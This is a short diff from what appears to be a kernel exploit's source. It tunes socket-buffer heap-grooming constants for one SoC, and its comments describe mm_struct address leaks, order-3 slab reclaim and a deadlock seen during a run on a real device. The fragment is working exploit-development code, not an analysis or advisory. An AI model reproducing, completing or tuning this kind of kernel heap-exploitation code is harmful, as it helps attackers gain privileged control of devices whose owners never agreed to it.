@@ -55,7 +55,16 @@ namespace ghostlock::kernel {
      * mm_struct scan has nothing to match and every heap-preparation attempt
      * fails with "mm_struct leaked=0xffffffffffffffff" -- which is what a real
      * run on this device did before this branch existed. */
-    inline constexpr unsigned long SKB_SEND_SIZE = ORDER3_SIZE * 256;
+    /* Upstream raises the send COUNT on this SoC, not the per-send SIZE:
+     * SKB_SEND_SIZE stays two order-3 slabs (64 KiB) and the socket gets
+     * SKB_RECLAIM_SENDS attempts.
+     *
+     * Sizing the single send up instead (ORDER3_SIZE * 256) deadlocks it.
+     * prepare_kernel_page's shaping sendmsg() is blocking and its peer end is
+     * never drained, so it parks in sock_wait_for_wmem forever -- confirmed on
+     * device: the run reached the group reclaim, freed the slab, then hung at
+     * 0% CPU in sendto() with wchan=sock_wait_for_wmem. */
+    inline constexpr unsigned long SKB_SEND_SIZE = ORDER3_SIZE * 2;
     inline constexpr unsigned long SKB_RECLAIM_SENDS = 256;
 #else
     inline constexpr unsigned long SKB_SEND_SIZE = ORDER3_SIZE * 2;
